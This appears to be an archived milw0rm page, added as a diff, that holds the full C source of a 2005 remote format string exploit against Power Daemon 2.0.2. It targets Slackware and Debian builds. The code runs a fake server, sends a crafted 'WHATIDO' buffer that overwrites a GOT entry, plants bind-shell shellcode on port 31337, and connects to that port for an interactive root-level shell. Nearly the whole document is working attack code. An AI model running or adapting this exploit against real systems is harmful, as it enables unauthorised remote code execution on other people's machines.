@@ -1,0 +1,370 @@
+<html>
+<head>
+<title>Power Daemon <= 2.0.2 (WHATIDO) Remote Format String Exploit</title>
+<pre>
+/*
+ * gexp-powerd.c
+ *
+ * Power Daemon v2.0.2 Remote Format String Exploit
+ * Copyright (C) 2005 Gotfault Security
+ *
+ * Bug found and developed by: barros and xgc
+ *
+ * Original Reference:
+ * http://gotfault.net/research/exploit/gexp-powerd.c
+ *
+ */
+
+#include &lt;getopt.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;netdb.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;stdio.h&gt;
+
+/*==[ Prototypes ]==*/
+void fatal(char *);
+void Usage(char *);
+void FakeServer(char *,int);
+void ExecuteShell(int);
+int  CreateEvilBuffer(int,int,int,int,char *);
+int  ConnectToShell(char *,int);
+
+/*==[ Defines ]==*/
+#define	DEFAULT_PORT		532	// Default fake server port
+#define BIND_PORT		31337	// Default port to bind
+#define NOPSIZE			50	// Number of NOP
+#define NOP			0x90	// NOP byte
+#define PAD			&quot;&quot;	// Format string alignment
+#define PORT_OFFSET		29	// Offset to fix the shellcode
+#define STDIN			0
+#define STDOUT			1
+
+/*==[ Targets ]==*/
+struct
+{
+	char	*Name;
+	int	Gotaddr;
+	int	Retaddr;
+	int	Pop;
+}Targets[] =
+	{
+		&quot;Power Daemon v2.0.2 @ Slackware 10.0&quot;,
+		0x0804c180,
+		0xbffff2d4,
+		17,
+
+                &quot;Power Daemon v2.0.2 @ Debian 3.1 Linux&quot;,
+                0x0804c198,
+                0xbffff16c,
+                27,
+
+		// Finish
+		0,
+		0,
+		0,
+		0
+	};
+
+/*==[ Shellcode by Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt; ]==*/
+char shellcode[] =
+        &quot;\x31\xc0\x31\xdb\xb0\x17\xcd\x80&quot;
+        &quot;\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80&quot;
+        &quot;\x89\xc7\x52\x66\x68&quot;
+        &quot;BP&quot; // Port to bind
+        &quot;\x43\x66\x53\x89\xe1\xb0\x10\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80&quot;
+        &quot;\xb0\x66\xb3\x04\xcd\x80&quot;
+        &quot;\x50\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80&quot;
+        &quot;\x89\xd9\x89\xc3\xb0\x3f\x49\xcd\x80&quot;
+        &quot;\x41\xe2\xf8\x51\x68n/sh\x68//bi\x89\xe3\x51\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;
+
+int main(int argc, char **argv)
+{
+	extern  char		*optarg;
+	extern  int		optind;
+		char		opt;
+		char		*Host = NULL;
+		int		Port = DEFAULT_PORT;
+		int		BindPort = BIND_PORT;
+		int		TargetNumber = -1;
+		int		Sock,i;
+		char		EvilBuffer[1024];
+		int		BufLen;
+
+	fprintf(stdout,&quot;\n--=[ Power Daemon Remote Format String Exploit ]\n\n&quot;);
+	
+	// Process arguments
+	while ( (opt = getopt(argc,argv,&quot;t:p:r:&quot;)) != EOF)
+	{
+		switch(opt)
+		{
+			case 'r':
+				BindPort = atoi(optarg);
+				if(!BindPort) Usage(argv[0]);
+			break;
+			case 'p':
+				Port = atoi(optarg);
+				if(!Port) Usage(argv[0]);
+			break;
+			case 't':
+				TargetNumber = atoi(optarg);
+			break;
+			default: Usage(argv[0]);
+			break;
+		}
+	}
+
+	// Verify target
+	for(i=0;;i++)
+		if(Targets[i].Name == 0) break;
+	if(TargetNumber == -1) Usage(argv[0]);
+
+	fprintf(stdout,&quot;[*] Plataform             : %s\n&quot;,Targets[TargetNumber].Name);
+        fprintf(stdout,&quot;[*] Target GOT            : %#010x\n&quot;,Targets[TargetNumber].Gotaddr);
+        fprintf(stdout,&quot;[*] Target Retaddr        : %#010x\n&quot;,Targets[TargetNumber].Retaddr);
+        fprintf(stdout,&quot;[*] Bind to port          : %u\n&quot;,BindPort);
+        fprintf(stdout,&quot;[*] Target POP            : %d\n\n&quot;,Targets[TargetNumber].Pop);
+
+	CreateEvilBuffer(Targets[TargetNumber].Gotaddr,Targets[TargetNumber].Retaddr,Targets[TargetNumber].Pop,BindPort,EvilBuffer);
+	FakeServer(EvilBuffer, BindPort);
+}
+
+void FakeServer(char *EvilBuffer, int BindPort) {
+
+	int sock, newsock, i, reuseaddr = 1;
+	struct sockaddr_in remoteaddr;
+	struct sockaddr_in localaddr;
+	int addrlen = sizeof(struct sockaddr_in);
+	struct hostent *he;
+
+	localaddr.sin_family = AF_INET;
+	localaddr.sin_port = htons(DEFAULT_PORT);
+	localaddr.sin_addr.s_addr = INADDR_ANY;
+	bzero(&amp;(localaddr.sin_zero), 8);
+
+	fprintf(stdout,&quot;[*] Creating Fake Server  : &quot;);
+
+	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) &lt; 0) {
+		perror(&quot; socket()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+
+	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &amp;reuseaddr,
+		(socklen_t)sizeof(reuseaddr)) &lt; 0) {
+		perror(&quot; setsockopt()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+
+	if (bind(sock, (struct sockaddr *)&amp;localaddr, sizeof(localaddr)) &lt; 0) {
+		perror(&quot; bind()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+
+	if (listen(sock, 1) &lt; 0) {
+		perror(&quot; listen()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+	
+	fprintf(stdout, &quot;done\n&quot;);
+
+	printf(&quot;[*] Waiting Client        : &quot;);
+	fflush(stdout);
+
+	if ((newsock = accept(sock, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen)) &lt; 0) {
+		perror(&quot; accept()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+
+	if (getpeername(newsock, (struct sockaddr *)&amp;remoteaddr, &amp;addrlen) &lt; 0) {
+		perror(&quot; getpeername()&quot;);
+		printf(&quot;\n&quot;);
+		exit(1);
+	}
+
+	fprintf(stdout, &quot;done\n&quot;);
+
+	fprintf(stdout, &quot;[*] Host Connected        : %s:%u\n&quot;, inet_ntoa(remoteaddr.sin_addr), ntohs(remoteaddr.sin_port));
+
+	fprintf(stdout, &quot;[*] Sending EvilBuffer    : &quot;);
+	if(send(newsock,EvilBuffer,strlen(EvilBuffer)+1,0) == -1) {
+		fatal(&quot;send()&quot;);
+	}
+
+	fprintf(stdout, &quot;done\n\n&quot;);
+
+	memset(EvilBuffer, 0x00, sizeof(EvilBuffer));
+	strcpy(EvilBuffer, (char *)inet_ntoa(remoteaddr.sin_addr));
+	
+        close(newsock);
+
+        sleep(1);
+
+        newsock = ConectToShell(EvilBuffer,BindPort);
+
+        if(newsock == -1) {
+                fprintf(stdout,&quot;[*] Exploit Failed.\n\n&quot;);
+                exit(0);
+        }
+        else {
+                fprintf(stdout,&quot;[*] Spawning Shell...\n\n&quot;);
+                ExecuteShell(newsock);
+                close(newsock);
+        }
+
+	fflush(stdout);
+}
+
+int CreateEvilBuffer(int GOT, int RETADDR, int POP, int BINDTOPORT, char *buffer)
+{
+        char            *nops = malloc(NOPSIZE+1);
+        char            *ptr; 
+        unsigned short  *len;
+        unsigned short  *portPtr = (unsigned short *)(shellcode+PORT_OFFSET);
+
+        // Fix shellcode
+        *portPtr = htons(BINDTOPORT);
+
+        ptr = buffer;
+
+        // Create Nops
+        bzero(nops,NOPSIZE+1);
+        memset(nops,NOP,NOPSIZE);
+
+	fprintf(stdout, &quot;[*] Creating EvilBuffer   : &quot;);
+
+        // Create format string attack
+        sprintf(ptr,&quot;WHATIDO &quot;
+                PAD
+                &quot;%c%c%c%c&quot;
+                &quot;%c%c%c%c&quot;
+                &quot;%%.%dd&quot;
+                &quot;%%%d$hn&quot;
+                &quot;%%.%dd&quot;
+                &quot;%%%d$hn&quot;
+                &quot;%s%s&quot;,
+                ((u_long)GOT),
+                ((u_long)GOT &gt;&gt; 8),
+                ((u_long)GOT &gt;&gt; 16),
+                ((u_long)GOT &gt;&gt; 24),
+                ((u_long)GOT+2),
+                (((u_long)GOT+2) &gt;&gt; 8),
+                (((u_long)GOT+2) &gt;&gt; 16),
+                (((u_long)GOT+2) &gt;&gt; 24),
+                ((RETADDR &amp; 0x0000FFFF) - 26),
+                POP,
+                (((RETADDR &amp; 0xFFFF0000)&gt;&gt;16) + 0x10000 - (RETADDR &amp; 0x0000FFFF)),
+                POP+1,nops,shellcode);
+	fprintf(stdout, &quot;done\n&quot;);
+	fflush(stdout);
+
+        return (strlen(ptr));
+}
+
+int ConectToShell(char *Host,int Port)
+{
+        struct          sockaddr_in server;
+        struct          hostent *hp;
+        int             s;
+
+        server.sin_family = AF_INET;
+        hp = gethostbyname(Host);
+        if(!hp) return(-1);
+
+        memcpy(&amp;server.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+        server.sin_port = htons(Port);
+
+        s = socket(PF_INET,SOCK_STREAM,0);
+        if(connect(s,(struct sockaddr *)&amp;server, sizeof(server)) &lt; 0)
+                return(-1);
+
+        return(s);
+}
+
+void ExecuteShell(int Sock)
+{
+        char            buffer[1024 * 10];
+        int             count;
+        fd_set          readfs;
+
+        write(Sock,&quot;uname -a;id\n&quot;,12);
+        while(1)
+        {
+                FD_ZERO(&amp;readfs);
+                FD_SET(STDIN, &amp;readfs);
+                FD_SET(Sock, &amp;readfs);
+                if(select(Sock + 1, &amp;readfs, NULL, NULL, NULL) &gt; 0)
+                {
+                        if(FD_ISSET(STDIN, &amp;readfs))
+                        {
+                                if((count = read(STDIN, buffer, 1024)) &lt;= 0)
+                                {
+                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
+                                                continue;
+                                        else
+                                        {
+                                                close(Sock);
+                                                exit(-1);
+                                        }
+                                }
+                                write(Sock, buffer, count);
+                        }
+                        if(FD_ISSET(Sock, &amp;readfs))
+                        {
+                                if((count = read(Sock, buffer, 1024)) &lt;= 0)
+                                {
+                                        if(errno == EWOULDBLOCK || errno == EAGAIN)
+                                                continue;
+                                        else
+                                        {
+                                                close(Sock);
+                                                exit(-1);
+                                        }
+                                }
+                                write(STDOUT, buffer, count);
+                        }
+                }
+	}
+}
+
+void fatal(char *ErrorMsg)
+{
+        fprintf(stderr,&quot;ERROR - %s\n\n&quot;,ErrorMsg);
+        exit(1);
+}
+
+
+void Usage(char *Prog)
+{
+        int i;
+        fprintf(stderr, &quot;Usage: %s &lt;options&gt;\n\n&quot;
+                        &quot;Options:\n\n&quot;
+                        &quot; -t target     : Select the target\n&quot;
+			&quot; -p portnumber : Sets a new port number &lt;default: %d&gt;\n&quot;
+                        &quot; -r bindport   : Sets the port to bind a shell &lt;default: %d&gt;\n\n&quot;
+                        &quot;Targets:\n\n&quot;,Prog,DEFAULT_PORT,BIND_PORT);
+
+        for(i=0;;i++)
+        {
+                if(Targets[i].Name != 0)
+                        fprintf(stderr,&quot; [%u] %s\n&quot;,i,Targets[i].Name);
+                else
+                        break;
+        }
+        fprintf(stderr,&quot;\n&quot;);
+        exit(1);
+}
+
+// milw0rm.com [2006-02-10]
+</pre>
+</html>
+
